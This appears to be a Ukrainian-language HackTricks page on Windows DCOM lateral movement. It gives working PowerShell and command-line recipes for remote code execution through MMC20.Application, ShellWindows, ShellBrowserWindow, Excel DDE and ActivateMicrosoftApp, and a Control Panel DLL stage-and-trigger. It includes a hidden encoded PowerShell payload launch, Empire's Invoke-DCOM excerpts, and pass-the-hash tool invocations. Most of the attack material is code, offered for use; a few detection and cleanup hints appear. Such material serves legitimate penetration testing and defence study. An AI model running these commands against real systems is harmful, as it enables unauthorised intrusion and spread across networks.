# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement привабливий, оскільки повторно використовує наявні COM servers, доступні через RPC/DCOM, замість створення service або scheduled task. На практиці це означає, що початкове з'єднання зазвичай починається через TCP/135, а потім переходить на динамічно призначені високі RPC-порти.

## Prerequisites & Gotchas

- Зазвичай потрібен контекст локального адміністратора на target, а віддалений COM server має дозволяти remote launch/activation.
- Починаючи з **14 березня 2023 року**, Microsoft застосовує DCOM hardening для підтримуваних систем. Старі clients, які запитують низький authentication level для activation, можуть завершуватися помилкою, якщо не узгодять щонайменше `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Сучасні Windows clients зазвичай автоматично підвищують цей рівень, тому поточні інструменти зазвичай продовжують працювати.<sup>[[3]](#references)</sup>
- Для ручного або scripted DCOM execution зазвичай потрібні TCP/135 і діапазон dynamic RPC ports target. Якщо ви використовуєте Impacket's `dcomexec.py` і хочете отримати вивід команд, зазвичай також потрібен SMB access до `ADMIN$` (або іншого share, доступного для запису/читання).
- Якщо RPC/DCOM працює, але SMB заблокований, `dcomexec.py -nooutput` все одно може бути корисним для blind execution.

Швидкі перевірки:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Докладніше про цю technique дивіться в [оригінальному дописі про MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects надають цікаві можливості для мережевої взаємодії з objects. Microsoft надає вичерпну документацію щодо DCOM і Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) і [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список DCOM applications можна отримати за допомогою команди PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Об'єкт COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), дає змогу створювати скрипти для операцій із snap-in MMC. Примітно, що цей об'єкт містить метод `ExecuteShellCommand` у `Document.ActiveView`. Додаткову інформацію про цей метод можна знайти [тут](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Перевірте його роботу:<sup>[[6]](#references)</sup>

Ця функція дає змогу виконувати команди через мережу за допомогою DCOM application. Для віддаленої взаємодії з DCOM як admin можна використати PowerShell:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до DCOM application і повертає екземпляр COM object. Після цього можна викликати метод ExecuteShellCommand для виконання процесу на віддаленому хості. Процес складається з таких кроків:

Перевірити методи:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримати RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Останній аргумент — це стиль вікна. `7` залишає вікно мінімізованим. З операційної точки зору виконання на основі MMC зазвичай призводить до того, що віддалений процес `mmc.exe` запускає ваш payload, що відрізняється від об’єктів на основі Explorer, описаних нижче.

## ShellWindows & ShellBrowserWindow

**Докладніше про цю техніку див. в оригінальній публікації [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Було встановлено, що об’єкт **MMC20.Application** не має явних "LaunchPermissions", натомість використовуються дозволи за замовчуванням, які надають доступ Administrators. Докладніше це питання розглянуто [тут](https://twitter.com/tiraniddo/status/817532039771525120), а для фільтрації об’єктів без явного Launch Permission рекомендується використовувати OleView .NET від [@tiraniddo](https://twitter.com/tiraniddo).

Два конкретні об’єкти — `ShellBrowserWindow` і `ShellWindows` — привернули увагу через відсутність явних Launch Permissions. Відсутність запису реєстру `LaunchPermission` у `HKCR:\AppID\{guid}` означає відсутність явних дозволів.

Порівняно з `MMC20.Application`, ці об’єкти часто є менш помітними з погляду OPSEC, оскільки команда на віддаленому хості зазвичай стає дочірнім процесом `explorer.exe`, а не `mmc.exe`.

### ShellWindows

Для `ShellWindows`, який не має ProgID, методи .NET `Type.GetTypeFromCLSID` і `Activator.CreateInstance` дають змогу створити екземпляр об’єкта за допомогою його AppID. У цьому процесі використовується OleView .NET для отримання CLSID `ShellWindows`. Після створення екземпляра взаємодія можлива через метод `WindowsShell.Item`, що дає змогу викликати метод на кшталт `Document.Application.ShellExecute`.

Було наведено приклади команд PowerShell для створення екземпляра об’єкта та віддаленого виконання команд:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` подібний, але його можна безпосередньо інстанціювати через його CLSID і виконати pivot до `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Латеральне переміщення за допомогою Excel DCOM Objects

Латерального переміщення можна досягти, експлуатуючи Excel DCOM objects. Для отримання детальної інформації рекомендується ознайомитися з обговоренням використання Excel DDE для латерального переміщення через DCOM у [блозі Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Проєкт Empire містить PowerShell script, який демонструє використання Excel для remote code execution (RCE) шляхом маніпулювання DCOM objects. Нижче наведено фрагменти script, доступного в [GitHub repository Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), що демонструють різні методи зловживання Excel для RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Нещодавні дослідження розширили цю область за допомогою методу `ActivateMicrosoftApp()` у `Excel.Application`. Ключова ідея полягає в тому, що Excel може спробувати запустити застарілі програми Microsoft, такі як FoxPro, Schedule Plus або Project, здійснюючи пошук у системному `PATH`. Якщо operator може розмістити payload з одним із очікуваних імен у доступному для запису розташуванні, що входить до `PATH` цільової системи, Excel виконає його.<sup>[[4]](#references)</sup>

Вимоги для цього варіанта:

- Local admin на цільовій системі
- Excel, встановлений на цільовій системі
- Можливість записати payload у доступний для запису каталог у `PATH` цільової системи

Практичний приклад експлуатації пошуку FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Якщо на атакуючому хості не зареєстровано локальний ProgID `Excel.Application`, створіть віддалений об’єкт за допомогою CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Значення, які на практиці використовувалися зловмисниками:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — завантаження зареєстрованої DLL Control Panel

Клас `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) надає `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Його метод `Open()` змушує віддалений `dllhost.exe` завантажувати DLL Control Panel, зареєстровані в ключі `Control Panel\Cpls`. На перевірених системах клас не має явно заданих дозволів на запуск/доступ, тому успадковує стандартну політику DCOM (зазвичай для віддаленої активації потрібні права адміністратора). Щоб змусити `Open()` обробити зареєстровані DLL, достатньо довільного імені елемента; payload не потребує розширення `.cpl`, хоча він має бути коректною DLL відповідної архітектури.<sup>[[7]](#references)</sup>

Цей primitive використовує підхід **stage-and-trigger**, а не виконання лише команд: спочатку скопіюйте DLL на цільову систему та створіть значення `REG_EXPAND_SZ`, яке вказує на неї, а потім активуйте об’єкт через DCOM. Наприклад, з адміністративного контексту Windows:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Публічний клієнт [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) реалізує недокументований виклик DCOM за допомогою Impacket. Достатньо вказати довільне ім’я елемента Control Panel; клієнт може повідомити про помилку RPC, навіть якщо `dllhost.exe` завантажив DLL.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Операційно цей шлях також потребує каналу запису файлів і віддаленого доступу до реєстру, тому він помітніший за `MMC20`/`ShellWindows`. Він створює побічний ефект persistence, оскільки під час подальшого відкриття Control Panel той самий запис може завантажитися знову. Видаліть значення після виконання та шукайте неочікувані значення `Control Panel\Cpls` разом із незвичними завантаженнями DLL у `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Засоби автоматизації для Lateral Movement

Для автоматизації цих технік виділено два інструменти:

- **Invoke-DCOM.ps1**: PowerShell-скрипт, наданий проєктом Empire, який спрощує виклик різних методів виконання коду на віддалених машинах. Цей скрипт доступний у GitHub-репозиторії Empire.

- **SharpLateral**: інструмент, призначений для віддаленого виконання коду, який можна використовувати за допомогою команди:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Автоматичні інструменти

- Скрипт Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дозволяє легко використовувати всі описані способи виконання code на інших машинах.
- Ви можете використовувати `dcomexec.py` з Impacket для виконання команд у віддалених системах за допомогою DCOM. Поточні збірки підтримують `ShellWindows`, `ShellBrowserWindow` і `MMC20`, а за замовчуванням використовується `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ви також можете використати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ви також можете використовувати [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement за допомогою COM Object MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement через DCOM: раунд 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — керування змінами для обходу функції безпеки Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: зловживання можливостями DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Використання Excel DDE для Lateral Movement через DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com — клас MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Використання об'єктів DCOM для віддаленого виконання команд](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
